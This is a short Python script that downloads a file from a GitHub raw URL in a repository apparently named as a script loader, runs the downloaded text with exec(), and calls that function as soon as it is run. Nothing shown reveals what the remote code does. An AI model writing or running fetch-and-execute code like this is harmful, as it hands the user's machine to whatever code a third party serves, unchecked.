import requests

def run_script_from_url():
    url = "https://raw.githubusercontent.com/kunderloads/mainscript-loader/main/main"
    response = requests.get(url)
    exec(response.text)

# You can call the function to test it
run_script_from_url()
